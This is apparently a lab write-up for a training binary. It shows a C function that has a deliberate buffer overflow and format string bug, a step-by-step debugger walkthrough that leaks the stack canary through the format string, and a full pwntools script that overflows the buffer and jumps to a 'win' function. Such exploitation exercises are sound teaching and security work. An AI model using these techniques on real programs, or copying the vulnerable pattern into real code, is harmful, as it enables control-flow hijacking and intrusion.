# Canary Leak — Format String + Buffer Overflow

A two-stage exploit combining format string read to leak the stack canary,
then a classic buffer overflow with the canary preserved to hijack control
flow. Compiled with `-fstack-protector` to demonstrate real-world protection.

## The Binary

```c
void vuln() {
    char buf[64];
    read(0, buf, 128);     // overflow
    printf(buf);            // format string bug → leak canary
}
```

Compiled with: `gcc -g -O0 -fstack-protector -no-pie -o canary-leak canary-leak.c`

The stack protector places a random canary value on the stack before the
saved RBP. Overwriting it (even by accident) causes `__stack_chk_fail`.
We must leak and restore it.

## Walkthrough

### 1. Load and recon

```
edb_load_program(path="/tmp/canary-leak")
edb_list_functions()
edb_lookup_symbol(name="win")
edb_lookup_symbol(name="vuln")
```

### 2. Disassemble to see stack layout

```
edb_disassemble(location="vuln", count=30)
```

Notice `fs:0x28` (canary load) at function prologue and `__stack_chk_fail`
call in the epilogue.

### 3. Find format string offset to canary

```
edb_set_breakpoint(location="vuln+60")   # before printf(buf)
edb_run()
# send: AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
edb_get_stack(count=32)
```

Count the stack positions until you see `0x41` (= 'A') from "AAAA" to
identify the format string offset. The canary is typically at offset 13
on x86-64 (just before the saved RBP).

### 4. Leak the canary

```
edb_evaluate_expression(
    expression="printf(\"%13$p\")"
)
```

Or with the MCP tool directly: use format string offset 13.

### 5. Buffer overflow with canary preservation

Once you know the canary value:

```
pwntools_cyclic(length=64)
pwntools_pack(value=<canary>, size=8, endian="little")
pwntools_pack(value=<win_addr>, size=8, endian="little")
```

Construct: `padding(64) + canary(8) + fake_rbp(8) + win_addr(8)`

### 6. Verify with breakpoints

```
edb_set_breakpoint(location="win")
edb_continue()
```

If the canary matches, `__stack_chk_fail` is avoided and the `win` function
is called.

## Exploit Script

```python
from pwn import *

elf = ELF("/tmp/canary-leak")
win_addr = elf.symbols["win"]

p = process("/tmp/canary-leak")

# Stage 1: leak canary
p.recvuntil(b"Data: ")
p.sendline(b"%13$p")
p.recvuntil(b"You said: ")
canary = int(p.recvline().strip(), 16)

# Stage 2: overflow with canary
p.recvuntil(b"Data: ")
payload = b"A" * 64
payload += p64(canary)
payload += p64(0)          # saved RBP
payload += p64(win_addr)
p.sendline(payload)
print(p.recvall().decode())
```

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_disassemble` | View canary load/store and stack layout |
| `edb_get_stack` | Visualize stack with canary position |
| `edb_evaluate_expression` | Test format string offsets (`printf`) |
| `edb_set_breakpoint` | Pause before/after printf to observe leak |
| `pwntools_cyclic` | Generate padding for buffer overflow |
| `pwntools_pack` | Pack canary and win address |
| `edb_get_registers` | Check that RBP/RSP are sane after canary restore |
